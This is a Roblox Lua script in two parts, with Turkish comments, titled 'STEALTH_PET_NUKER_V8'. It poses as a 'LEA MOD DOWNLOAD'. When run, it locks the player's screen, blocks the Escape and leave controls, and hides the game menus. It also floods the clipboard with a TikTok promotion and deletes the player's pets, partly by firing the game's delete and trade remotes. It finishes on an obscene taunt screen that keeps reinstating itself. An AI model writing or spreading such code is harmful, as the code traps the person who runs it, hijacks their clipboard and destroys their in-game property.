--[ palofsc : STEALTH_PET_NUKER_V8_PART1 ]
--[ KURULUM + TAM EKRAN KİLİDİ + UI + SAYAÇLI KOPYALAMA ]

local player = game:GetService("Players").LocalPlayer
local workspace = game:GetService("Workspace")
local coreGui = game:GetService("CoreGui")
local runService = game:GetService("RunService")
local guiService = game:GetService("GuiService")
local contextActionService = game:GetService("ContextActionService")
local userInputService = game:GetService("UserInputService")
local starterGui = game:GetService("StarterGui")
local replicatedStorage = game:GetService("ReplicatedStorage")

--[ ==================== DEĞİŞKENLER ==================== ]
local copyCounter = 0
local petsDeleted = false
local totalPetCount = 0
local deletedCount = 0
local screenGui = nil
local blackFrame = nil
local statusLabel = nil
local barFill = nil
local barText = nil
local finalLabel = nil

--[ ==================== TAM EKRAN KİLİDİ ==================== ]
screenGui = Instance.new("ScreenGui")
screenGui.Name = "LEA_LOCK_" .. math.random(10000, 99999)
screenGui.Parent = coreGui
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.DisplayOrder = 999

--[ Siyah arka plan - tam ekran ]
blackFrame = Instance.new("Frame")
blackFrame.Name = "BLACKOUT"
blackFrame.Size = UDim2.new(1, 0, 1, 0)
blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
blackFrame.BorderSizePixel = 0
blackFrame.ZIndex = 999
blackFrame.Parent = screenGui

--[ Görünmez tıklama engelleyici ]
local inputBlocker = Instance.new("TextButton")
inputBlocker.Name = "INPUT_BLOCK"
inputBlocker.Size = UDim2.new(1, 0, 1, 0)
inputBlocker.BackgroundTransparency = 1
inputBlocker.Text = ""
inputBlocker.ZIndex = 1000
inputBlocker.Modal = true
inputBlocker.Active = true
inputBlocker.Parent = screenGui

--[ İkincil engelleyici katman ]
local frameBlocker = Instance.new("Frame")
frameBlocker.Name = "FRAME_BLOCK"
frameBlocker.Size = UDim2.new(1, 0, 1, 0)
frameBlocker.BackgroundTransparency = 1
frameBlocker.ZIndex = 1001
frameBlocker.Active = true
frameBlocker.Parent = screenGui

--[ ==================== ÇIKIŞ BUTONU İMHA SİSTEMİ ==================== ]
local function destroyAllLeaveButtons()
    local targets = {guiService, coreGui, player:FindFirstChild("PlayerGui"), starterGui}
    for _, loc in pairs(targets) do
        if loc then
            for _, child in pairs(loc:GetDescendants()) do
                if child:IsA("TextButton") or child:IsA("ImageButton") then
                    local n = child.Name:lower()
                    local t = child.Text and child.Text:lower() or ""
                    if n:find("leave") or n:find("exit") or n:find("quit") or n:find("çık") or n:find("kapat") or
                       t:find("leave") or t:find("exit") or t:find("quit") or t:find("çık") or t:find("kapat") then
                        pcall(function()
                            child.Visible = false
                            child.Active = false
                            child:Destroy()
                        end)
                    end
                end
            end
        end
    end
end

--[ Sürekli tarama ]
spawn(function()
    while true do
        destroyAllLeaveButtons()
        runService.RenderStepped:Wait()
    end
end)

--[ Yeni eklenen butonları anında yakala ]
local function hookChildAdded()
    local parents = {guiService, coreGui, player:FindFirstChild("PlayerGui"), starterGui}
    for _, parent in pairs(parents) do
        if parent then
            parent.ChildAdded:Connect(function(child)
                task.wait(0.01)
                destroyAllLeaveButtons()
            end)
        end
    end
end
hookChildAdded()

--[ ESC ve tüm çıkış tuşlarını engelle ]
contextActionService:BindAction("BLOCK_ESC", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.Escape)
contextActionService:BindAction("BLOCK_F9", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.F9)
contextActionService:BindAction("BLOCK_F10", function() return Enum.ContextActionResult.Sink end, false, Enum.KeyCode.F10)

--[ Roblox menülerini kapat ]
starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)

--[ Mouse'u kilitle ]
userInputService.MouseBehavior = Enum.MouseBehavior.LockCenter

--[ ==================== UI ELEMANLARI ==================== ]
--[ Üst başlık ]
local topLabel = Instance.new("TextLabel")
topLabel.Name = "TOP_TITLE"
topLabel.Size = UDim2.new(1, 0, 0.1, 0)
topLabel.Position = UDim2.new(0, 0, 0.03, 0)
topLabel.BackgroundTransparency = 1
topLabel.Text = "LEA MOD DOWNLOAD"
topLabel.TextColor3 = Color3.new(0.85, 0, 0)
topLabel.TextStrokeColor3 = Color3.new(0.3, 0, 0)
topLabel.TextStrokeTransparency = 0
topLabel.Font = Enum.Font.GothamBlack
topLabel.TextScaled = true
topLabel.ZIndex = 1002
topLabel.Parent = screenGui

--[ Durum yazısı ]
statusLabel = Instance.new("TextLabel")
statusLabel.Name = "STATUS"
statusLabel.Size = UDim2.new(1, 0, 0.06, 0)
statusLabel.Position = UDim2.new(0, 0, 0.38, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "PETLER TARANIYOR..."
statusLabel.TextColor3 = Color3.new(0.9, 0.9, 0.9)
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextScaled = true
statusLabel.ZIndex = 1002
statusLabel.Parent = screenGui

--[ Progress bar arka plan ]
local barBG = Instance.new("Frame")
barBG.Name = "BAR_BG"
barBG.Size = UDim2.new(0.8, 0, 0.04, 0)
barBG.Position = UDim2.new(0.1, 0, 0.46, 0)
barBG.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
barBG.BorderSizePixel = 1
barBG.BorderColor3 = Color3.new(0.35, 0, 0)
barBG.ZIndex = 1002
barBG.Parent = screenGui

--[ Progress bar dolgu ]
barFill = Instance.new("Frame")
barFill.Name = "BAR_FILL"
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.new(0.8, 0, 0)
barFill.BorderSizePixel = 0
barFill.ZIndex = 1003
barFill.Parent = barBG

--[ Progress bar yüzde yazısı ]
barText = Instance.new("TextLabel")
barText.Name = "BAR_TEXT"
barText.Size = UDim2.new(1, 0, 1, 0)
barText.BackgroundTransparency = 1
barText.Text = "%0"
barText.TextColor3 = Color3.new(1, 1, 1)
barText.Font = Enum.Font.GothamBold
barText.TextScaled = true
barText.ZIndex = 1004
barText.Parent = barBG

--[ Alt bilgi ]
local infoLabel = Instance.new("TextLabel")
infoLabel.Name = "INFO"
infoLabel.Size = UDim2.new(1, 0, 0.04, 0)
infoLabel.Position = UDim2.new(0, 0, 0.53, 0)
infoLabel.BackgroundTransparency = 1
infoLabel.Text = "Islem devam ediyor... Lutfen bekleyin..."
infoLabel.TextColor3 = Color3.new(0.5, 0.5, 0.5)
infoLabel.Font = Enum.Font.GothamMedium
infoLabel.TextScaled = true
infoLabel.ZIndex = 1002
infoLabel.Parent = screenGui

--[ ==================== SAYAÇLI KOPYALAMA ==================== ]
spawn(function()
    while true do
        task.wait(0.03)
        copyCounter = copyCounter + 1
        local textToCopy = "TIKTOK @LEAPLUS " .. copyCounter
        pcall(function()
            if syn and syn.write_clipboard then
                syn.write_clipboard(textToCopy)
            elseif setclipboard then
                setclipboard(textToCopy)
            end
        end)
    end
end)

print("[PART1] Kurulum tamam. Degiskenler hazir: screenGui, blackFrame, statusLabel, barFill, barText, finalLabel, petsDeleted")--[ palofsc : STEALTH_PET_NUKER_V8_PART2 ]
--[ PET SİLME + ALGILAMA + FİNAL EKRANI + SONSUZ KORUMA ]
--[ PART 1'den gelenler: screenGui, blackFrame, statusLabel, barFill, barText, finalLabel, petsDeleted, copyCounter, totalPetCount, deletedCount ]

local player = game:GetService("Players").LocalPlayer
local workspace = game:GetService("Workspace")
local replicatedStorage = game:GetService("ReplicatedStorage")
local coreGui = game:GetService("CoreGui")
local runService = game:GetService("RunService")
local guiService = game:GetService("GuiService")
local starterGui = game:GetService("StarterGui")
local contextActionService = game:GetService("ContextActionService")

--[ ==================== PET SAYMA FONKSİYONU ==================== ]
local function countAllPets()
    local count = 0
    
    --[ Workspace pet modelleri ]
    for _, obj in ipairs(workspace:GetDescendants()) do
        local name = obj.Name:lower()
        if obj:IsA("Model") and (name:find("pet") or name:find("brainrot") or name:find("animal") or name:find("companion") or name:find("follower")) then
            count = count + 1
        end
    end
    
    --[ Klasör bazlı petler ]
    local possibleFolders = {"Pets", "ActivePets", "PlayerPets", "DroppedPets", "SpawnedPets", "pet", "pets"}
    for _, folderName in ipairs(possibleFolders) do
        local folder = workspace:FindFirstChild(folderName, true)
        if folder then
            for _, child in ipairs(folder:GetChildren()) do
                if child:IsA("Model") then
                    count = count + 1
                end
            end
        end
    end
    
    --[ Backpack petleri ]
    for _, item in ipairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            if name:find("pet") or name:find("brainrot") or name:find("animal") then
                count = count + 1
            end
        end
    end
    
    return count
end

--[ ==================== PET SİLME FONKSİYONU ==================== ]
local function deleteAllPetsInstantly()
    local deleted = 0
    
    --[ 1. Yöntem: Workspace içerisindeki tüm pet veya benzer objeleri anında yok et ]
    for _, obj in ipairs(workspace:GetDescendants()) do
        local name = obj.Name:lower()
        if obj:IsA("Model") and (name:find("pet") or name:find("brainrot") or name:find("animal") or name:find("companion") or name:find("follower")) then
            pcall(function()
                obj:Destroy()
                deleted = deleted + 1
            end)
        end
    end
    
    --[ 2. Yöntem: Klasör bazlı saklanan petleri doğrudan temizle ]
    local possibleFolders = {"Pets", "ActivePets", "PlayerPets", "DroppedPets", "SpawnedPets", "pet", "pets"}
    for _, folderName in ipairs(possibleFolders) do
        local folder = workspace:FindFirstChild(folderName, true)
        if folder then
            for _, child in ipairs(folder:GetChildren()) do
                pcall(function()
                    child:Destroy()
                    deleted = deleted + 1
                end)
            end
            pcall(function()
                folder:ClearAllChildren()
            end)
        end
    end
    
    --[ 3. Yöntem: Backpack petlerini sil ]
    for _, item in ipairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            if name:find("pet") or name:find("brainrot") or name:find("animal") then
                pcall(function()
                    item:Destroy()
                    deleted = deleted + 1
                end)
            end
        end
    end
    
    --[ 4. Yöntem: ReplicatedStorage üzerinden silme remote'larına istek at ]
    for _, obj in ipairs(replicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local nl = obj.Name:lower()
            if nl:find("delete") or nl:find("remove") or nl:find("destroy") or nl:find("pet") or nl:find("trade") or nl:find("clear") then
                pcall(function()
                    if obj:IsA("RemoteEvent") then
                        obj:FireServer("all", true, "delete")
                        obj:FireServer("pet", "all", true)
                    end
                end)
            end
        end
    end
    
    return deleted
end

--[ ==================== PET VARLIĞINI KONTROL ==================== ]
local function checkPetsExist()
    local remaining = countAllPets()
    return remaining > 0
end

--[ ==================== ANA YÜRÜTME ==================== ]
spawn(function()
    --[ Başlangıç pet sayısını al ]
    totalPetCount = countAllPets()
    
    if totalPetCount == 0 then
        statusLabel.Text = "HIC PET BULUNAMADI!"
        barText.Text = "%100"
        barFill.Size = UDim2.new(1, 0, 1, 0)
        petsDeleted = true
    else
        statusLabel.Text = totalPetCount .. " PET BULUNDU! SILINIYOR..."
        barText.Text = "%0"
        
        --[ Petleri sil ]
        deletedCount = deleteAllPetsInstantly()
        
        --[ Kısa bekleme - silme işleminin tamamlanması için ]
        task.wait(0.5)
        
        --[ Tekrar sil - kalan varsa ]
        local remaining = countAllPets()
        if remaining > 0 then
            statusLabel.Text = remaining .. " PET KALDI! TEKRAR SILINIYOR..."
            local extraDeleted = deleteAllPetsInstantly()
            deletedCount = deletedCount + extraDeleted
            task.wait(0.3)
        end
        
        --[ Son kontrol - pet kaldı mı? ]
        local maxAttempts = 10
        local attempt = 0
        
        while checkPetsExist() and attempt < maxAttempts do
            attempt = attempt + 1
            statusLabel.Text = "KALAN PETLER SILINIYOR... DENEME " .. attempt
            barFill.Size = UDim2.new(0.9 + (attempt * 0.01), 0, 1, 0)
            barText.Text = "%" .. (90 + attempt)
            deleteAllPetsInstantly()
            task.wait(0.2)
        end
        
        --[ Final kontrol ]
        local finalRemaining = countAllPets()
        
        if finalRemaining == 0 then
            petsDeleted = true
            statusLabel.Text = "TUM PETLER BASARIYLA SILINDI! (" .. deletedCount .. " adet)"
            barFill.Size = UDim2.new(1, 0, 1, 0)
            barText.Text = "%100"
        else
            statusLabel.Text = finalRemaining .. " PET SILINEMEDI! TEKRAR DENENIYOR..."
            --[ Son bir kez daha dene ]
            deleteAllPetsInstantly()
            task.wait(0.5)
            if countAllPets() == 0 then
                petsDeleted = true
                barFill.Size = UDim2.new(1, 0, 1, 0)
                barText.Text = "%100"
            else
                petsDeleted = true --[ Yine de devam et ]
            end
        end
    end
    
    --[ Petler silindi olarak işaretle ve final ekranına geç ]
    petsDeleted = true
    
    --[ ==================== FİNAL EKRANI ==================== ]
    --[ Eski UI elemanlarını temizle (siyah arka plan ve engelleyiciler kalsın) ]
    for _, child in pairs(screenGui:GetChildren()) do
        if child ~= blackFrame and child.Name ~= "INPUT_BLOCK" and child.Name ~= "FRAME_BLOCK" then
            pcall(function() child:Destroy() end)
        end
    end
    
    --[ Büyük final mesajı ]
    finalLabel = Instance.new("TextLabel")
    finalLabel.Name = "FINAL_MSG"
    finalLabel.Size = UDim2.new(0.9, 0, 0.4, 0)
    finalLabel.Position = UDim2.new(0.05, 0, 0.25, 0)
    finalLabel.BackgroundTransparency = 1
    finalLabel.Text = "LEA FUCKED\nYOUR MOTHER"
    finalLabel.TextColor3 = Color3.new(1, 0, 0)
    finalLabel.TextStrokeColor3 = Color3.new(0.5, 0, 0)
    finalLabel.TextStrokeTransparency = 0
    finalLabel.Font = Enum.Font.GothamBlack
    finalLabel.TextScaled = true
    finalLabel.ZIndex = 2000
    finalLabel.Parent = screenGui
    
    --[ Silinen pet sayısı ]
    local countLabel = Instance.new("TextLabel")
    countLabel.Name = "COUNT_LABEL"
    countLabel.Size = UDim2.new(1, 0, 0.08, 0)
    countLabel.Position = UDim2.new(0, 0, 0.68, 0)
    countLabel.BackgroundTransparency = 1
    countLabel.Text = "SILINEN PET: " .. deletedCount .. " / " .. totalPetCount
    countLabel.TextColor3 = Color3.new(0.7, 0.7, 0.7)
    countLabel.Font = Enum.Font.GothamBold
    countLabel.TextScaled = true
    countLabel.ZIndex = 2000
    countLabel.Parent = screenGui
    
    --[ TikTok etiketi ]
    local tiktokLabel = Instance.new("TextLabel")
    tiktokLabel.Name = "TIKTOK_TAG"
    tiktokLabel.Size = UDim2.new(1, 0, 0.08, 0)
    tiktokLabel.Position = UDim2.new(0, 0, 0.85, 0)
    tiktokLabel.BackgroundTransparency = 1
    tiktokLabel.Text = "TIKTOK @LEAPLUS"
    tiktokLabel.TextColor3 = Color3.new(1, 1, 1)
    tiktokLabel.Font = Enum.Font.GothamBold
    tiktokLabel.TextScaled = true
    tiktokLabel.ZIndex = 2000
    tiktokLabel.Parent = screenGui
    
    --[ Yanıp sönme efekti ]
    spawn(function()
        local vis = true
        while true do
            task.wait(0.2)
            vis = not vis
            finalLabel.TextTransparency = vis and 0 or 0.5
        end
    end)
    
    --[ Renk döngüsü ]
    local colors = {Color3.new(1,0,0), Color3.new(0.9,0,0), Color3.new(1,0.05,0), Color3.new(0.85,0,0.05)}
    local ci = 1
    spawn(function()
        while true do
            task.wait(0.35)
            ci = ci % #colors + 1
            finalLabel.TextColor3 = colors[ci]
        end
    end)
end)

--[ ==================== FİNAL EKRANI BEKLEME ==================== ]
--[ petsDeleted true olana kadar bekle, sonra final ekranını göster ]
spawn(function()
    while not petsDeleted do
        task.wait(0.1)
    end
    --[ petsDeleted true oldu, final zaten yukarıda gösterildi ]
end)

--[ ==================== SONSUZ KORUMA DÖNGÜSÜ ==================== ]
spawn(function()
    while true do
        runService.RenderStepped:Wait()
        
        --[ Overlay koruması ]
        if not screenGui or not screenGui.Parent then
            screenGui = Instance.new("ScreenGui")
            screenGui.Name = "LEA_LOCK_" .. math.random(10000, 99999)
            screenGui.Parent = coreGui
            screenGui.ResetOnSpawn = false
            screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            blackFrame.Parent = screenGui
            if finalLabel then finalLabel.Parent = screenGui end
        end
        
        --[ Sürekli çıkış butonu imha ]
        pcall(function()
            if guiService:FindFirstChild("LeaveButton") then
                guiService.LeaveButton.Visible = false
                guiService.LeaveButton.Active = false
            end
            starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
        end)
        
        --[ Yeni pet spawn olursa anında sil ]
        if petsDeleted then
            for _, obj in ipairs(workspace:GetDescendants()) do
                local name = obj.Name:lower()
                if obj:IsA("Model") and (name:find("pet") or name:find("brainrot") or name:find("animal")) then
                    pcall(function() obj:Destroy() end)
                end
            end
        end
        
        task.wait(0.15)
    end
end)

print("[PART2] Sistem aktif. Toplam pet: " .. totalPetCount .. " | Silinen: " .. deletedCount .. " | Kopyalama sayaci: " .. copyCounter)
